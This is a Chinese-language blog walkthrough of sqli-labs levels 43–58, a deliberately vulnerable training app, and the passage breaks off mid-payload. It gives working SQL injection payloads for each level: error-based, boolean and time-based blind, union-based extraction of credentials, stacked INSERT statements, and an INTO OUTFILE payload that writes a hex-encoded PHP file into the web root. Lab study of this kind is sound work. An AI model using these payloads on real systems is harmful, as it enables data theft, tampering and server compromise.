title="Less43：POST-基于报错的堆叠注入字符型(带括号)"></a>Less43：POST-基于报错的堆叠注入字符型(带括号)</h3><p>搞注入的地方和上一关一样啊，，，</p><p>试了半天的错被怼了半天。。。最后发现要在密码框进行试错，，，</p><p><img src="image-20210222023102002.png" alt="image-20210222023102002"></p><p>闭合为<code>&#39;)</code></p><p>剩下的和前一贯一样了</p><h3 id="Less44：POST-基于报错-盲注-堆叠注入字符型"><a href="#Less44：POST-基于报错-盲注-堆叠注入字符型" class="headerlink" title="Less44：POST-基于报错-盲注-堆叠注入字符型"></a>Less44：POST-基于报错-盲注-堆叠注入字符型</h3><p>老地方，，，，不过换个方式，试试万能密码：<code>1&#39; or 1=1#</code>，成了！</p><p><img src="image-20210222024937343.png" alt="image-20210222024937343"></p><p>哈哈，不过在登录界面就可以堆叠注入了</p><p>payload：<code>1&#39;;insert into users values (&#39;44&#39;,&#39;less44&#39;,&#39;less44&#39;)#</code></p><h3 id="Less45：POST-基于报错字符型-盲注-堆叠注入"><a href="#Less45：POST-基于报错字符型-盲注-堆叠注入" class="headerlink" title="Less45：POST-基于报错字符型-盲注-堆叠注入"></a>Less45：POST-基于报错字符型-盲注-堆叠注入</h3><p>45 关与 43 关一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;);insert into users(id,username,password) values(45,&#x27;</span>Less45<span class="string">&#x27;,&#x27;</span>Less45<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><h3 id="Less46：GET-基于报错-数字型-排序注入"><a href="#Less46：GET-基于报错-数字型-排序注入" class="headerlink" title="Less46：GET-基于报错-数字型-排序注入"></a>Less46：GET-基于报错-数字型-排序注入</h3><p>这一关参考：<a href="https://blog.csdn.net/weixin_39934520/article/details/106167470%EF%BC%8C%E6%94%B6%E8%8E%B7%E6%BB%A1%E6%BB%A1%EF%BC%81">https://blog.csdn.net/weixin_39934520/article/details/106167470，收获满满！</a></p><p>可以发现输入sort的值不一样，排序结果就不一样，那么猜测后台肯定用到该参数进行排序！那么后台语句应该是：<code>select * from users order by $sort</code></p><p>这就好办了</p><h4 id="1-sort-select"><a href="#1-sort-select" class="headerlink" title="1.?sort&#x3D;(select ******)"></a>1.?sort&#x3D;(select ******)</h4><p>也算是结合报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">数据库</span><br><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br><span class="line">表</span><br><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br><span class="line">字段</span><br><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br><span class="line">数据</span><br><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;-&#x27;</span>,id,username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br><span class="line"></span><br><span class="line">在《注入天书》中还见到了派生表的另一种写法：</span><br><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">updatexml的例子</span><br><span class="line">?sort<span class="operator">=</span>UpdateXml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">延时注入</span><br><span class="line">?sort<span class="operator">=</span>if(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) </span><br><span class="line">?sort<span class="operator">=</span>if(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">布尔盲注</span><br><span class="line">因为<span class="keyword">order</span> <span class="keyword">by</span>接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是没有作用的，我们只能用第三句式的rand()函数，通过观察ID顺序的不同，即可判断<span class="literal">true</span>页面和<span class="literal">false</span>页面。</span><br><span class="line"><span class="literal">true</span>:?sort<span class="operator">=</span>rand(ascii(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>)</span><br><span class="line">fslse:?sort<span class="operator">=</span>rand(ascii(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>)</span><br><span class="line"></span><br><span class="line">利用 <span class="keyword">procedure</span> analyse 参数，我们可以执行报错注入。</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">导出文件 <span class="keyword">into</span> outfile 参数注入：</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210222031730681.png" alt="image-20210222031730681"></p><h3 id="Less47：GET-基于报错-字符型-排序注入-单引号"><a href="#Less47：GET-基于报错-字符型-排序注入-单引号" class="headerlink" title="Less47：GET-基于报错-字符型-排序注入(单引号)"></a>Less47：GET-基于报错-字符型-排序注入(单引号)</h3><p>和46差不多，只是闭合不一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">基于报错注入</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+</span></span><br><span class="line"><span class="string">?sort=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))x)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"> <span class="type">Time</span> 盲注</span><br><span class="line"> ?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(mid(database(),1,1))=115,1,sleep(0.3))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">procedure analyse 参数后注</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">into outfile 参数注入</span></span><br><span class="line"><span class="string">?sort=1&#x27;</span> <span class="keyword">into</span> outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.txt&quot; <span class="comment">--+</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span></span><br></pre></td></tr></table></figure><h3 id="Less48：GET-基于报错-盲注-数字型排序注入"><a href="#Less48：GET-基于报错-盲注-数字型排序注入" class="headerlink" title="Less48：GET-基于报错-盲注-数字型排序注入"></a>Less48：GET-基于报错-盲注-数字型排序注入</h3><p>本关与 less-46 的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Bool 盲注</span><br><span class="line">?sort<span class="operator">=</span>rand((ascii(mid((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Time</span> 盲注</span><br><span class="line">?sort<span class="operator">=</span>if(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">0.1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">into</span> outfile 参数注入</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="Less49：GET-基于报错-盲注-字符型排序注入"><a href="#Less49：GET-基于报错-盲注-字符型排序注入" class="headerlink" title="Less49：GET-基于报错-盲注-字符型排序注入"></a>Less49：GET-基于报错-盲注-字符型排序注入</h3><p> 本关与 47 关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进 行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Time</span> 盲注</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(mid(database(),1,1))=115,1,sleep(1))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">into outfile 参数注入</span></span><br><span class="line"><span class="string">?sort=1&#x27;</span> <span class="keyword">into</span> outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.txt&quot; <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less50：GET-基于报错-数字型-排序堆叠注入"><a href="#Less50：GET-基于报错-数字型-排序堆叠注入" class="headerlink" title="Less50：GET-基于报错-数字型-排序堆叠注入"></a>Less50：GET-基于报错-数字型-排序堆叠注入</h3><p>执行 sql 语句我们这里使用的是 mysqli_multi_query()函数，而之前我们使用的是 mysqli _query()，区别在于 mysqli_multi_query()可以执行多个 sql 语句，而 mysqli_query()只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 sta tcked injection。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> users(id,username,password) <span class="keyword">values</span>(<span class="number">50</span>,<span class="string">&#x27;Less50&#x27;</span>,<span class="string">&#x27;Less50&#x27;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less51：GET-基于报错-字符型-排序堆叠注入"><a href="#Less51：GET-基于报错-字符型-排序堆叠注入" class="headerlink" title="Less51：GET-基于报错-字符型-排序堆叠注入"></a>Less51：GET-基于报错-字符型-排序堆叠注入</h3><p> 和Less-50的一样，但是注意单引号的闭合和注释符。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+</span></span><br></pre></td></tr></table></figure><h3 id="Less52：GET-bool盲注-数字型-排序堆叠注入"><a href="#Less52：GET-bool盲注-数字型-排序堆叠注入" class="headerlink" title="Less52：GET-bool盲注-数字型-排序堆叠注入"></a>Less52：GET-bool盲注-数字型-排序堆叠注入</h3><p> 布尔盲注，延时注入都可以参考Less-46</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> users(id,username,password) <span class="keyword">values</span>(<span class="number">52</span>,<span class="string">&#x27;Less52&#x27;</span>,<span class="string">&#x27;Less52&#x27;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less53：GET-盲注-字符型-排序堆叠注入"><a href="#Less53：GET-盲注-字符型-排序堆叠注入" class="headerlink" title="Less53：GET-盲注-字符型-排序堆叠注入"></a>Less53：GET-盲注-字符型-排序堆叠注入</h3><p>和上一关一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;insert into users(id,username,password) values(53,&#x27;</span>Less53<span class="string">&#x27;,&#x27;</span>Less53<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs记录3</title>
      <link href="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/"/>
      <url>/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/</url>
      
        <content type="html"><![CDATA[<p>本文记录sqli-labs第54-65关，也算是踩了很多坑吧</p><span id="more"></span><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-判断闭合"><a href="#1-判断闭合" class="headerlink" title="1.判断闭合"></a>1.判断闭合</h3><p>之前判断闭合直接是上符号再闭合进行判断，这样是不对的，容易出错，应该采用以下方式:来源于Y4tacker</p><p>判断闭合方式，目前常用的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)</p><h4 id="1-常规判断方法"><a href="#1-常规判断方法" class="headerlink" title="1.常规判断方法"></a>1.常规判断方法</h4><p>1.首先尝试：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>”</span><br></pre></td></tr></table></figure><ul><li>如果都报错，则为整形闭合。</li></ul><p>2.如果单引号报错，双引号不报错。然后尝试</p><ul><li><pre><code class="sql">?id=1&#39; --+?id=1&#39; #  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 无报错则单引号闭合。报错则单引号加括号。</span><br><span class="line"></span><br><span class="line">3.如果单引号不报错，双引号报错。然后尝试</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=1&quot; --+</span><br><span class="line">?id=1&quot; #</span><br></pre></td></tr></table></figure></code></pre></li><li><p>无报错则双引号闭合。报错则双引号加括号。</p></li></ul><h4 id="2-真假值判断"><a href="#2-真假值判断" class="headerlink" title="2.真假值判断"></a>2.真假值判断</h4><p>1.输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>输入，错误回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>那么就是整形闭合</p><p>2.输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span>‘ <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>输入，错误回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span>‘ <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>那么就是单引号闭合，其他符号同理</p><h4 id="3-order-by闭合方式判断"><a href="#3-order-by闭合方式判断" class="headerlink" title="3.order by闭合方式判断()"></a>3.order by闭合方式判断()</h4><p>是否存在注入，若结果不同，就是存在注入，可以往下进行，若结果相同，判断是否为字符注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">desc</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">asc</span></span><br></pre></td></tr></table></figure><p>是否为数字注入，显示结果不同，则为数字注入，相同，则往下进行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="keyword">right</span>(version(),<span class="number">1</span>)</span><br><span class="line">?sort<span class="operator">=</span><span class="keyword">left</span>(version(),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>是否为布尔类型，此时我们可以用报错注入和延时注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand(<span class="literal">true</span>)</span><br><span class="line">?sort<span class="operator">=</span>rand(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>是否为字符注入，回显结果不一样，就说明闭合方式为单引号，其他闭合方式（双引号，单引号括号，双引号括号）同理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h3><p>按照惯性思维，一般都是order by进行判断，但有时候不一定会成功，就应该考虑其他方式了。</p><h4 id="1-order-by"><a href="#1-order-by" class="headerlink" title="1.order by"></a>1.order by</h4><p>语法：<code>?id=1&#39; order by 1,2,3--+</code></p><h4 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h4><p>语法：<code>?id=1&#39; union select 1,2,3--+</code></p><p>在这里要说一点就是括号的优先级大于单双引号，如果我们遇到 字符型带括号类型注入，如字符型单引号小括号，如果我们在url中输入?id&#x3D;1)–+ ?id&#x3D;1”)–+ 由于优先级的问题页面是会返回正常，但后台数据库并没有成功的进行闭合，使用union注入后都无法成功进行注入。</p><h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less54：GET-union查询-每轮允许10次"><a href="#Less54：GET-union查询-每轮允许10次" class="headerlink" title="Less54：GET-union查询-每轮允许10次"></a>Less54：GET-union查询-每轮允许10次</h3><blockquote><table bgcolor="#7FFFD4">题目要求：The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts. For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</table><table bgcolor="#7FFFD4">意思就是此挑战的目标是在不到10次的尝试中从数据库（challenges）的随机表中转储（密钥）。超过10此就会重置，每次都会生成随机表名、列名和表数据。</table></blockquote><p> 第一关先按正常步骤来，后面的直接贴关键的了</p><p>1.找闭合，单引号闭合</p><p><img src="image-20210222143225062.png" alt="image-20210222143225062"><img src="image-20210222143241840.png" alt="image-20210222143241840"></p><p>单引号不正常，双引号正常，则闭合为单引号</p><p>2.找字段数：3</p><p>这一步试了很多，注释符用<code>#</code>注释不了，只能用<code>--+</code>，而且不能用<code>order by</code>进行判断，只能用 <code>union select</code></p><p><img src="image-20210222143750422.png" alt="image-20210222143750422"><img src="image-20210222143813899.png" alt="image-20210222143813899"></p><p>3.爆数据库，这一关已经给出数据库是’CHALLENGES’了，所以不用查了，但是往往需要自己查，payload如下</p><p><code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p><p>4.爆表名：</p><p>payload:<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;CHALLENGES&#39; --+</code></p><p><img src="image-20210222141724070.png" alt="image-20210222141724070"></p><p>5.爆字段</p><p>payload：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;5t0md80073&#39;--+</code></p><p><img src="image-20210222141842212.png" alt="image-20210222141842212"></p><p>有一个secret_9PML，猜测 Secret Key在这个里面</p><p>6.爆数据</p><p>payload：<code>?id=-1&#39; union select 1,2,group_concat(secret_9PML) from challenges.5t0md80073--+</code></p><p><img src="image-20210222142214759.png" alt="image-20210222142214759"></p><p>7.验证结果，正确！</p><p><img src="image-20210222142251627.png" alt="image-20210222142251627"></p><h3 id="Less55：GET-union查询-每轮允许14次-1"><a href="#Less55：GET-union查询-每轮允许14次-1" class="headerlink" title="Less55：GET-union查询-每轮允许14次-1"></a>Less55：GET-union查询-每轮允许14次-1</h3><p>判断闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1                正确回显</span><br><span class="line">?id=1&#x27;      无错误异常回显</span><br><span class="line">?id=1&quot;      无错误异常回显#是数字型所以单双引号都会报错</span><br><span class="line">?id=1&#x27;)--+   无错误异常回显#要注意的是这里使用union注入发现单单一个数字型无法注入成功的时候就要考虑是否含有小括号</span><br><span class="line">?id=1&quot;)--+   无错误异常回显</span><br><span class="line">?id=1)--+    正确回显</span><br></pre></td></tr></table></figure><p>除了闭合不一样，其余都和54关一样</p><h3 id="Less56：GET-union查询-每轮允许14次-2"><a href="#Less56：GET-union查询-每轮允许14次-2" class="headerlink" title="Less56：GET-union查询-每轮允许14次-2"></a>Less56：GET-union查询-每轮允许14次-2</h3><p>判断回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1          正确回显</span><br><span class="line">?id=1&quot;          正确回显</span><br><span class="line">?id=1&#x27;          无错误异常回显</span><br><span class="line">?id=1&#x27;--+      无错误异常回显</span><br><span class="line">?id=1&#x27;)--+    正常回显</span><br><span class="line"></span><br><span class="line">格外说明：（这种情况只出现在字符型注入中，造成这样的原因是括号的优先级高。如果是数字型带括号下面的语句会直接报错的，）</span><br><span class="line">?id=1)--+     虽然正确回显,但是后台数据库并没有闭合成功，无法进行注入</span><br><span class="line">?id=1&quot;)--+   虽然正确回显，但是后台数据库并没有闭合成功，无法进行注入</span><br></pre></td></tr></table></figure><p>其他都一样</p><h3 id="Less57：GET-union查询-每轮允许14次-3"><a href="#Less57：GET-union查询-每轮允许14次-3" class="headerlink" title="Less57：GET-union查询-每轮允许14次-3"></a>Less57：GET-union查询-每轮允许14次-3</h3><p>判断闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;正确回显</span><br><span class="line">?id=1&quot;异常回显</span><br><span class="line">?id=1&quot;异常回显</span><br><span class="line">?id=1&quot;--+异常回显</span><br><span class="line">?id=1&quot;)--+正常回显</span><br></pre></td></tr></table></figure><p>其他都一样。</p><h3 id="Less58：GET-双查询-每轮允许5次-1"><a href="#Less58：GET-双查询-每轮允许5次-1" class="headerlink" title="Less58：GET-双查询-每轮允许5次-1"></a>Less58：GET-双查询-每轮允许5次-1</h3><p>判断闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;异常回显</span><br><span class="line">?id=1&quot;正常回显</span><br><span class="line">?id=1&#x27; -- #正常回显</span><br></pre></td></tr></table></figure><p>这一关无法使用union查询，看图</p><p><img src="image-20210222235011326.png" alt="image-20210222235011326"><img src="image-20210222235043270.png" alt="image-20210222235043270"></p><p><img src="image-20210222235600326.png" alt="image-20210222235600326" style="zoom: 67%;"><img src="image-20210222235625583.png" alt="image-20210222235625583" style="zoom:80%;"></p><p>其他都一样</p><p> 使用group_concat()函数进行双注入报错</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">表</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;),floor(rand()*2)) as a from information_schema.tables group by a--+</span></span><br><span class="line"><span class="string">字段</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span 